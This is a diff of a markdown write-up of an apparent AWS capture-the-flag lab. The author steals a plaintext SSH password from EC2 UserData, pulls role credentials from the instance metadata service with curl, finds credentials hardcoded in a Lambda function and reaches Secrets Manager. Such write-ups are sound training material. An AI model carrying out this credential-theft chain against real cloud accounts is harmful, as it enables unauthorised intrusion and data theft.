@@ -18,10 +18,12 @@ Goal: Retrieve the final "flag" stored in the Secrets Manager.
 ## 🚀 Step 1: First steps and "Whoami?"
 
 First things first: I need to set up the profile to start operating. I used the following command:
-aws configure --profile data_secrets
+
+```aws configure --profile data_secrets```
 
 Before moving an inch, I had to confirm the credentials actually worked and see exactly which user I was:
-aws sts get-caller-identity --profile data_secrets
+
+```aws sts get-caller-identity --profile data_secrets```
 
 ![data_secrets](<assests/Secrets Keys - data_secrets.png>)
 
@@ -30,9 +32,8 @@ aws sts get-caller-identity --profile data_secrets
 ## 🔍 Step 2: The IAM Wall (Enumeration)
 As any good auditor, the first thing I tried was checking my own permissions. I wanted to list my policies, but... I hit my first wall:
 
-Bash
-aws iam list-user-policies --user-name cg-start-user-[ID] --profile data_secrets
-aws iam list-attached-user-policies --user-name cg-start-user-[ID] --profile data_secrets
+```aws iam list-user-policies --user-name cg-start-user-[ID] --profile data_secrets```
+```aws iam list-attached-user-policies --user-name cg-start-user-[ID] --profile data_secrets```
 
 I got a hard AccessDenied. This user has their IAM permissions blocked, which forced me to "poke around the walls" in other services to see what I could find.
 
@@ -40,8 +41,8 @@ Digging for resources
 
 I started throwing commands to see what was alive in the account: S3, Lambda, RDS... but everything failed. Until I tried EC2:
 
-Bash
-aws ec2 describe-instances --profile data_secrets --query "Reservations[*].Instances[*].{ID:InstanceId,State:State.Name,PublicIP:PublicIpAddress,Role:IamInstanceProfile.Arn}" --output table
+```aws ec2 describe-instances --profile data_secrets --query "Reservations[*].Instances[*].{ID:InstanceId,State:State.Name,PublicIP:PublicIpAddress,Role:IamInstanceProfile.Arn}" --output table```
+
 Found something! There is an EC2 instance running and, most importantly, it has an IAM Role attached. This is my "foothold."
 
 ![describ-instances](<assests/describe instances.png>)
@@ -55,8 +56,8 @@ I have a public IP, so let's see what ports are open. I used nmap for a quick sc
 
 Port 22 (SSH) is open. But how do I get in if I don't have SSH keys? It occurred to me to check the UserData of the instance, which sometimes stores deployment scripts with sensitive info:
 
-Bash
-aws ec2 describe-instance-attribute --instance-id [ID] --attribute userData --profile data_secrets
+```aws ec2 describe-instance-attribute --instance-id [ID] --attribute userData --profile data_secrets```
+
 Awesome! I managed to get a username and password in plain text:
 
 User: ec2-user
@@ -74,9 +75,8 @@ Looking for another vector attack, I tried to see if I could modify the Security
 
 So the strategy was simple: log in via SSH using the credentials I stole from the UserData. Once inside, my target was the IMDS (Metadata Service) to see if I could "grab" the credentials from the instance's role.
 
-Bash
-# Check the role name and then its credentials
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-[ID]
+Bash:
+```curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-[ID]```
 
 ![ec2-retrieve-role-credentials](assests/retrieve-ec2-role-credentials.png)
 
@@ -85,7 +85,7 @@ It worked! Now I have fresh temporary keys. I logged out of the instance, config
 ## 🔀 Step 5: The missing link (The Lambda)
 Now acting as ec2_pwned, I tried going straight for the Secrets Manager, but I got an AccessDenied. I was still missing a link in the chain. I remembered the scenario mentioned a Lambda, so I listed it:
 
-aws lambda list-functions --profile ec2_pwned
+```aws lambda list-functions --profile ec2_pwned```
 
 ![lambda describe function](assests/lambda-describe-function.png)
 
@@ -96,7 +96,7 @@ Bingo! I found a classic leak: credentials for a user named db_user were hardcod
 ## 🏁 Step 6: The final blow to the Secrets Manager
 I configured my third and final profile: db_user_pwned. This was my last card to reach the secret. I tried listing the secrets and... this time, I got a hit:
 
-aws secretsmanager list-secrets --profile db_user_pwned
+```aws secretsmanager list-secrets --profile db_user_pwned```
 
 ![list-secrets](assests/list-secrets.png)
 
